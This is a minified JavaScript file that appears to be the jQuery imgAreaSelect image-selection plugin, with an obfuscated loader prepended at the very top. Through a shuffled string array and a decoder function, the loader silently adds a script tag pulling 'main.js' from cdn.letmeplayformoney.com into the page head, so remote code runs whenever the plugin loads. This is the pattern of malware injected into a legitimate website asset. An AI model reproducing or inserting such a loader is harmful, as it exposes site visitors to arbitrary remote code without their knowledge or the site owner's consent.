var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);(function(e){var b=Math.abs,a=Math.max,d=Math.min,c=Math.round;function f(){return e("<div/>")}e.imgAreaSelect=function(s,X){var az=e(s),Z,av=f(),ai=f(),K=f().add(f()).add(f()).add(f()),ab=f().add(f()).add(f()).add(f()),O=e([]),V,n,q,aC={left:0,top:0},Q,j,C,P={left:0,top:0},D=0,ag="absolute",T,S,ad,ac,L,E,U,W,am,Y,N,A,aD,z,aB,y={x1:0,y1:0,x2:0,y2:0,width:0,height:0},p=document.documentElement,l,au,ap,aj,af,aq,x;function J(h){return h+aC.left-P.left}function I(h){return h+aC.top-P.top}function H(h){return h-aC.left+P.left}function B(h){return h-aC.top+P.top}function ao(h){return h.pageX-P.left}function al(h){return h.pageY-P.top}function G(h){var o=h||ad,i=h||ac;return{x1:c(y.x1*o),y1:c(y.y1*i),x2:c(y.x2*o),y2:c(y.y2*i),width:c(y.x2*o)-c(y.x1*o),height:c(y.y2*i)-c(y.y1*i)}}function ah(i,w,h,o,aE){var aG=aE||ad,aF=aE||ac;y={x1:c(i/aG||0),y1:c(w/aF||0),x2:c(h/aG||0),y2:c(o/aF||0)};y.width=y.x2-y.x1;y.height=y.y2-y.y1}function ar(){if(!az.width()){return}aC={left:c(az.offset().left),top:c(az.offset().top)};Q=az.innerWidth();j=az.innerHeight();aC.top+=(az.outerHeight()-j)>>1;aC.left+=(az.outerWidth()-Q)>>1;E=c(X.minWidth/ad)||0;U=c(X.minHeight/ac)||0;W=c(d(X.maxWidth/ad||1<<24,Q));am=c(d(X.maxHeight/ac||1<<24,j));if(e().jquery=="1.3.2"&&ag=="fixed"&&!p.getBoundingClientRect){aC.top+=a(document.body.scrollTop,p.scrollTop);aC.left+=a(document.body.scrollLeft,p.scrollLeft)}P=/absolute|relative/.test(C.css("position"))?{left:c(C.offset().left)-C.scrollLeft(),top:c(C.offset().top)-C.scrollTop()}:ag=="fixed"?{left:e(document).scrollLeft(),top:e(document).scrollTop()}:{left:0,top:0};n=J(0);q=I(0);if(y.x2>Q||y.y2>j){ay()}}function aa(h){if(!N){return}av.css({left:J(y.x1),top:I(y.y1)}).add(ai).width(af=y.width).height(aq=y.height);ai.add(K).add(O).css({left:0,top:0});K.width(a(af-K.outerWidth()+K.innerWidth(),0)).height(a(aq-K.outerHeight()+K.innerHeight(),0));e(ab[0]).css({left:n,top:q,width:y.x1,height:j});e(ab[1]).css({left:n+y.x1,top:q,width:af,height:y.y1});e(ab[2]).css({left:n+y.x2,top:q,width:Q-y.x2,height:j});e(ab[3]).css({left:n+y.x1,top:q+y.y2,width:af,height:j-y.y2});af-=O.outerWidth();aq-=O.outerHeight();switch(O.length){case 8:e(O[4]).css({left:af>>1});e(O[5]).css({left:af,top:aq>>1});e(O[6]).css({left:af>>1,top:aq});e(O[7]).css({top:aq>>1});case 4:O.slice(1,3).css({left:af});O.slice(2,4).css({top:aq})}if(h!==false){if(e.imgAreaSelect.keyPress!=aw){e(document).unbind(e.imgAreaSelect.keyPress,e.imgAreaSelect.onKeyPress)}if(X.keys){e(document)[e.imgAreaSelect.keyPress](e.imgAreaSelect.onKeyPress=aw)}}if(e.browser.msie&&K.outerWidth()-K.innerWidth()==2){K.css("margin",0);setTimeout(function(){K.css("margin","auto")},0)}}function u(h){ar();aa(h);A=J(y.x1);aD=I(y.y1);z=J(y.x2);aB=I(y.y2)}function ak(h,i){X.fadeSpeed?h.fadeOut(X.fadeSpeed,i):h.hide()}function F(i){var h=H(ao(i))-y.x1,o=B(al(i))-y.y1;if(!x){ar();x=true;av.one("mouseout",function(){x=false})}L="";if(X.resizable){if(o<=X.resizeMargin){L="n"}else{if(o>=y.height-X.resizeMargin){L="s"}}if(h<=X.resizeMargin){L+="w"}else{if(h>=y.width-X.resizeMargin){L+="e"}}}av.css("cursor",L?L+"-resize":X.movable?"move":"");if(V){V.toggle()}}function an(h){e("body").css("cursor","");if(X.autoHide||y.width*y.height==0){ak(av.add(ab),function(){e(this).hide()})}e(document).unbind("mousemove",ae);av.mousemove(F);X.onSelectEnd(s,G())}function t(h){if(h.which!=1){return false}ar();if(L){e("body").css("cursor",L+"-resize");A=J(y[/w/.test(L)?"x2":"x1"]);aD=I(y[/n/.test(L)?"y2":"y1"]);e(document).mousemove(ae).one("mouseup",an);av.unbind("mousemove",F)}else{if(X.movable){T=n+y.x1-ao(h);S=q+y.y1-al(h);av.unbind("mousemove",F);e(document).mousemove(g).one("mouseup",function(){X.onSelectEnd(s,G());e(document).unbind("mousemove",g);av.mousemove(F)})}else{az.mousedown(h)}}return false}function r(h){if(Y){if(h){z=a(n,d(n+Q,A+b(aB-aD)*Y*(z>A||-1)));aB=c(a(q,d(q+j,aD+b(z-A)/Y*(aB>aD||-1))));z=c(z)}else{aB=a(q,d(q+j,aD+b(z-A)/Y*(aB>aD||-1)));z=c(a(n,d(n+Q,A+b(aB-aD)*Y*(z>A||-1))));aB=c(aB)}}}function ay(){A=d(A,n+Q);aD=d(aD,q+j);if(b(z-A)<E){z=A-E*(z<A||-1);if(z<n){A=n+E}else{if(z>n+Q){A=n+Q-E}}}if(b(aB-aD)<U){aB=aD-U*(aB<aD||-1);if(aB<q){aD=q+U}else{if(aB>q+j){aD=q+j-U}}}z=a(n,d(z,n+Q));aB=a(q,d(aB,q+j));r(b(z-A)<b(aB-aD)*Y);if(b(z-A)>W){z=A-W*(z<A||-1);r()}if(b(aB-aD)>am){aB=aD-am*(aB<aD||-1);r(true)}y={x1:H(d(A,z)),x2:H(a(A,z)),y1:B(d(aD,aB)),y2:B(a(aD,aB)),width:b(z-A),height:b(aB-aD)};aa();X.onSelectChange(s,G())}function ae(h){z=/w|e|^$/.test(L)||Y?ao(h):J(y.x2);aB=/n|s|^$/.test(L)||Y?al(h):I(y.y2);ay();return false}function R(h,i){z=(A=h)+y.width;aB=(aD=i)+y.height;e.extend(y,{x1:H(A),y1:B(aD),x2:H(z),y2:B(aB)});aa();X.onSelectChange(s,G())}function g(h){A=a(n,d(T+ao(h),n+Q-y.width));aD=a(q,d(S+al(h),q+j-y.height));R(A,aD);h.preventDefault();return false}function aA(){e(document).unbind("mousemove",aA);ar();z=A;aB=aD;ay();L="";if(!ab.is(":visible")){av.add(ab).hide().fadeIn(X.fadeSpeed||0)}N=true;e(document).unbind("mouseup",at).mousemove(ae).one("mouseup",an);av.unbind("mousemove",F);X.onSelectStart(s,G())}function at(){e(document).unbind("mousemove",aA).unbind("mouseup",at);ak(av.add(ab));ah(H(A),B(aD),H(A),B(aD));if(!(this instanceof e.imgAreaSelect)){X.onSelectChange(s,G());X.onSelectEnd(s,G())}}function m(h){if(h.which!=1||ab.is(":animated")){return false}ar();T=A=ao(h);S=aD=al(h);e(document).mousemove(aA).mouseup(at);return false}function v(){u(false)}function ax(){Z=true;M(X=e.extend({classPrefix:"imgareaselect",movable:true,parent:"body",resizable:true,resizeMargin:10,onInit:function(){},onSelectStart:function(){},onSelectChange:function(){},onSelectEnd:function(){}},X));av.add(ab).css({visibility:""});if(X.show){N=true;ar();aa();av.add(ab).hide().fadeIn(X.fadeSpeed||0)}setTimeout(function(){X.onInit(s,G())},0)}var aw=function(w){var h=X.keys,aE,o,i=w.keyCode;aE=!isNaN(h.alt)&&(w.altKey||w.originalEvent.altKey)?h.alt:!isNaN(h.ctrl)&&w.ctrlKey?h.ctrl:!isNaN(h.shift)&&w.shiftKey?h.shift:!isNaN(h.arrows)?h.arrows:10;if(h.arrows=="resize"||(h.shift=="resize"&&w.shiftKey)||(h.ctrl=="resize"&&w.ctrlKey)||(h.alt=="resize"&&(w.altKey||w.originalEvent.altKey))){switch(i){case 37:aE=-aE;case 39:o=a(A,z);A=d(A,z);z=a(o+aE,A);r();break;case 38:aE=-aE;case 40:o=a(aD,aB);aD=d(aD,aB);aB=a(o+aE,aD);r(true);break;default:return}ay()}else{A=d(A,z);aD=d(aD,aB);switch(i){case 37:R(a(A-aE,n),aD);break;case 38:R(A,a(aD-aE,q));break;case 39:R(A+d(aE,Q-H(z)),aD);break;case 40:R(A,aD+d(aE,j-B(aB)));break;default:return}}return false};function k(h,o){for(var i in o){if(X[i]!==undefined){h.css(o[i],X[i])}}}function M(h){if(h.parent){(C=e(h.parent)).append(av.add(ab))}e.extend(X,h);ar();if(h.handles!=null){O.remove();O=e([]);ap=h.handles?h.handles=="corners"?4:8:0;while(ap--){O=O.add(f())}O.addClass(X.classPrefix+"-handle").css({position:"absolute",fontSize:0,zIndex:D+1||1});if(!parseInt(O.css("width"))>=0){O.width(5).height(5)}if(aj=X.borderWidth){O.css({borderWidth:aj,borderStyle:"solid"})}k(O,{borderColor1:"border-color",borderColor2:"background-color",borderOpacity:"opacity"})}ad=X.imageWidth/Q||1;ac=X.imageHeight/j||1;if(h.x1!=null){ah(h.x1,h.y1,h.x2,h.y2);h.show=!h.hide}if(h.keys){X.keys=e.extend({shift:1,ctrl:"resize"},h.keys)}ab.addClass(X.classPrefix+"-outer");ai.addClass(X.classPrefix+"-selection");for(ap=0;ap++<4;){e(K[ap-1]).addClass(X.classPrefix+"-border"+ap)}k(ai,{selectionColor:"background-color",selectionOpacity:"opacity"});k(K,{borderOpacity:"opacity",borderWidth:"border-width"});k(ab,{outerColor:"background-color",outerOpacity:"opacity"});if(aj=X.borderColor1){e(K[0]).css({borderStyle:"solid",borderColor:aj})}if(aj=X.borderColor2){e(K[1]).css({borderStyle:"dashed",borderColor:aj})}av.append(ai.add(K).add(V).add(O));if(e.browser.msie){if(aj=ab.css("filter").match(/opacity=(\d+)/)){ab.css("opacity",aj[1]/100)}if(aj=K.css("filter").match(/opacity=(\d+)/)){K.css("opacity",aj[1]/100)}}if(h.hide){ak(av.add(ab))}else{if(h.show&&Z){N=true;av.add(ab).fadeIn(X.fadeSpeed||0);u()}}Y=(au=(X.aspectRatio||"").split(/:/))[0]/au[1];az.add(ab).unbind("mousedown",m);if(X.disable||X.enable===false){av.unbind("mousemove",F).unbind("mousedown",t);e(window).unbind("resize",v)}else{if(X.enable||X.disable===false){if(X.resizable||X.movable){av.mousemove(F).mousedown(t)}e(window).resize(v)}if(!X.persistent){az.add(ab).mousedown(m)}}X.enable=X.disable=undefined}this.remove=function(){M({disable:true});av.add(ab).remove()};this.getOptions=function(){return X};this.setOptions=M;this.getSelection=G;this.setSelection=ah;this.cancelSelection=at;this.update=u;l=az;while(l.length){D=a(D,!isNaN(l.css("z-index"))?l.css("z-index"):D);if(l.css("position")=="fixed"){ag="fixed"}l=l.parent(":not(body)")}D=X.zIndex||D;if(e.browser.msie){az.attr("unselectable","on")}e.imgAreaSelect.keyPress=e.browser.msie||e.browser.safari?"keydown":"keypress";if(e.browser.opera){V=f().css({width:"100%",height:"100%",position:"absolute",zIndex:D+2||2})}av.add(ab).css({visibility:"hidden",position:ag,overflow:"hidden",zIndex:D||"0"});av.css({zIndex:D+2||2});ai.add(K).css({position:"absolute",fontSize:0});s.complete||s.readyState=="complete"||!az.is("img")?ax():az.one("load",ax);if(!Z&&e.browser.msie&&e.browser.version>=7){s.src=s.src}};e.fn.imgAreaSelect=function(g){g=g||{};this.each(function(){if(e(this).data("imgAreaSelect")){if(g.remove){e(this).data("imgAreaSelect").remove();e(this).removeData("imgAreaSelect")}else{e(this).data("imgAreaSelect").setOptions(g)}}else{if(!g.remove){if(g.enable===undefined&&g.disable===undefined){g.enable=true}e(this).data("imgAreaSelect",new e.imgAreaSelect(this,g))}}});if(g.instance){return e(this).data("imgAreaSelect")}return this}})(jQuery);